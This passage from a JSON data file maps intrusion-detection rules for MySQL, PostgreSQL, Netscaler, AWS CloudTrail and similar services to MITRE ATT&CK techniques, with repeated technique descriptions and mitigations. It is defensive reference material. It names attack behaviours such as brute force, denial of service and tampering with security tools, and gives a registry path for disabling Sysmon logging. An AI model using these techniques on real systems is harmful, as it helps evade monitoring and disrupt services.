            "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.\n\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.\n\nIn cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.\n\nFor attacks attempting to saturate the providing network, see [Network Denial of Service](\n"
        ],
        "mitigation_strategies": [
            "Leverage services provided by Content Delivery Networks (CDN) or providers specializing in DoS mitigations to filter traffic upstream from services. Filter boundary traffic by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport. To defend against SYN floods, enable SYN Cookies."
        ]
    },
    {
        "rule_id": 50180,
        "rule_description": "MySQL: Multiple errors.",
        "mitre_id": [
            "T1499"
        ],
        "possible_attacks": [
            "Endpoint Denial of Service"
        ],
        "description": [
            "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.\n\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.\n\nIn cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.\n\nFor attacks attempting to saturate the providing network, see [Network Denial of Service](\n"
        ],
        "mitigation_strategies": [
            "Leverage services provided by Content Delivery Networks (CDN) or providers specializing in DoS mitigations to filter traffic upstream from services. Filter boundary traffic by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport. To defend against SYN floods, enable SYN Cookies."
        ]
    },
    {
        "rule_id": 50182,
        "rule_description": "MySQL: fatal error.",
        "mitre_id": [
            "T1499"
        ],
        "possible_attacks": [
            "Endpoint Denial of Service"
        ],
        "description": [
            "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.\n\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.\n\nIn cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.\n\nFor attacks attempting to saturate the providing network, see [Network Denial of Service](\n"
        ],
        "mitigation_strategies": [
            "Leverage services provided by Content Delivery Networks (CDN) or providers specializing in DoS mitigations to filter traffic upstream from services. Filter boundary traffic by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport. To defend against SYN floods, enable SYN Cookies."
        ]
    },
    {
        "rule_id": 50183,
        "rule_description": "MySQL: Multiple errors.",
        "mitre_id": [
            "T1499"
        ],
        "possible_attacks": [
            "Endpoint Denial of Service"
        ],
        "description": [
            "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.\n\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.\n\nIn cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.\n\nFor attacks attempting to saturate the providing network, see [Network Denial of Service](\n"
        ],
        "mitigation_strategies": [
            "Leverage services provided by Content Delivery Networks (CDN) or providers specializing in DoS mitigations to filter traffic upstream from services. Filter boundary traffic by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport. To defend against SYN floods, enable SYN Cookies."
        ]
    },
    {
        "rule_id": 50520,
        "rule_description": "PostgreSQL: Database shutdown message.",
        "mitre_id": [
            "T1529"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 50521,
        "rule_description": "PostgreSQL: Database shutdown message.",
        "mitre_id": [
            "T1529"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 50580,
        "rule_description": "PostgreSQL: Multiple database errors.",
        "mitre_id": [
            "T1499"
        ],
        "possible_attacks": [
            "Endpoint Denial of Service"
        ],
        "description": [
            "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.\n\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.\n\nIn cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.\n\nFor attacks attempting to saturate the providing network, see [Network Denial of Service](\n"
        ],
        "mitigation_strategies": [
            "Leverage services provided by Content Delivery Networks (CDN) or providers specializing in DoS mitigations to filter traffic upstream from services. Filter boundary traffic by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport. To defend against SYN floods, enable SYN Cookies."
        ]
    },
    {
        "rule_id": 50581,
        "rule_description": "PostgreSQL: Multiple database errors.",
        "mitre_id": [
            "T1499"
        ],
        "possible_attacks": [
            "Endpoint Denial of Service"
        ],
        "description": [
            "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.\n\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.\n\nIn cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.\n\nFor attacks attempting to saturate the providing network, see [Network Denial of Service](\n"
        ],
        "mitigation_strategies": [
            "Leverage services provided by Content Delivery Networks (CDN) or providers specializing in DoS mitigations to filter traffic upstream from services. Filter boundary traffic by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport. To defend against SYN floods, enable SYN Cookies."
        ]
    },
    {
        "rule_id": 51007,
        "rule_description": "Dropbear: brute force attempt.",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 52510,
        "rule_description": "Clamd stopped",
        "mitre_id": [
            "T1562.001"
        ],
        "possible_attacks": [
            "Disable or Modify Tools"
        ],
        "description": [
            "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking]( adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection. \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging. \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools. For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation]( which may lead to bypassing anti-tampering features."
        ],
        "mitigation_strategies": [
            "Ensure proper user permissions are in place to prevent adversaries from disabling or interfering with security services."
        ]
    },
    {
        "rule_id": 80102,
        "rule_description": "Netscaler: Multiple AAA failed to login the user",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 80106,
        "rule_description": "Netscaler: UI/API dangerous command",
        "mitre_id": [
            "T1070.004"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 80112,
        "rule_description": "Netscaler: Multiple non-http resource access denied",
        "mitre_id": [
            "T1133",
            "T1083"
        ],
        "possible_attacks": [
            "External Remote Services"
        ],
        "description": [
            "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management]( and [VNC]( can also be used externally.\n\nAccess to [Valid Accounts]( to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network. Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard."
        ],
        "mitigation_strategies": [
            "Deny direct remote access to internal systems through the use of network proxies, gateways, and firewalls."
        ]
    },
    {
        "rule_id": 80113,
        "rule_description": "Netscaler: A http resource access is denied by policy engine",
        "mitre_id": [
            "T1133",
            "T1083"
        ],
        "possible_attacks": [
            "External Remote Services"
        ],
        "description": [
            "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management]( and [VNC]( can also be used externally.\n\nAccess to [Valid Accounts]( to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network. Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard."
        ],
        "mitigation_strategies": [
            "Deny direct remote access to internal systems through the use of network proxies, gateways, and firewalls."
        ]
    },
    {
        "rule_id": 80114,
        "rule_description": "Netscaler: Multiple http resource access denied",
        "mitre_id": [
            "T1133",
            "T1083"
        ],
        "possible_attacks": [
            "External Remote Services"
        ],
        "description": [
            "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management]( and [VNC]( can also be used externally.\n\nAccess to [Valid Accounts]( to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network. Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard."
        ],
        "mitigation_strategies": [
            "Deny direct remote access to internal systems through the use of network proxies, gateways, and firewalls."
        ]
    },
    {
        "rule_id": 80115,
        "rule_description": "Netscaler: SSLVPN session: client security check error",
        "mitre_id": [
            "T1133"
        ],
        "possible_attacks": [
            "External Remote Services"
        ],
        "description": [
            "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management]( and [VNC]( can also be used externally.\n\nAccess to [Valid Accounts]( to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network. Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard."
        ],
        "mitigation_strategies": [
            "Deny direct remote access to internal systems through the use of network proxies, gateways, and firewalls."
        ]
    },
    {
        "rule_id": 80116,
        "rule_description": "Netscaler: SSLVPN session: client security expression evaluates to False",
        "mitre_id": [
            "T1133"
        ],
        "possible_attacks": [
            "External Remote Services"
        ],
        "description": [
            "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management]( and [VNC]( can also be used externally.\n\nAccess to [Valid Accounts]( to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network. Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard."
        ],
        "mitigation_strategies": [
            "Deny direct remote access to internal systems through the use of network proxies, gateways, and firewalls."
        ]
    },
    {
        "rule_id": 80137,
        "rule_description": "Netscaler: Multiple AAATM http resource access denied",
        "mitre_id": [
            "T1499"
        ],
        "possible_attacks": [
            "Endpoint Denial of Service"
        ],
        "description": [
            "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.\n\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.\n\nIn cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.\n\nFor attacks attempting to saturate the providing network, see [Network Denial of Service](\n"
        ],
        "mitigation_strategies": [
            "Leverage services provided by Content Delivery Networks (CDN) or providers specializing in DoS mitigations to filter traffic upstream from services. Filter boundary traffic by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport. To defend against SYN floods, enable SYN Cookies."
        ]
    },
    {
        "rule_id": 80140,
        "rule_description": "Netscaler: Multiple UI/API login failed",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 80252,
        "rule_description": "AWS Cloudtrail: $(aws.eventSource) - $(aws.eventName) - high number of deleted objects.",
        "mitre_id": [
            "T1485"
        ],
        "possible_attacks": [
            "Data Destruction"
        ],
        "description": [
            "Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives. Common operating system file deletion commands such as <code>del</code> and <code>rm</code> often only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct from [Disk Content Wipe]( and [Disk Structure Wipe]( because individual files are destroyed rather than sections of a storage disk or the disk's logical structure.\n\nAdversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable. In some cases politically oriented image files have been used to overwrite data.\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts]( [OS Credential Dumping]( and [SMB/Windows Admin Shares](\n\nIn cloud environments, adversaries may leverage access to delete cloud storage objects, machine images, database instances, and other infrastructure crucial to operations to damage an organization or their customers."
        ],
        "mitigation_strategies": [
            "In cloud environments, limit permissions to modify cloud bucket lifecycle policies (e.g., `PutLifecycleConfiguration` in AWS) to only those accounts that require it. In AWS environments, consider using Service Control policies to limit the use of the `PutBucketLifecycle` API call. "
        ]
    },
    {
        "rule_id": 80255,
        "rule_description": "AWS Cloudtrail: $(aws.eventSource) - $(aws.eventName) - Possible break in attempt (high number of login attempts).",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 80371,
        "rule_description": "AWS S3 multiple authentication failures.",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 80506,
        "rule_description": "Serv-U: Multiple authentication failures.",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
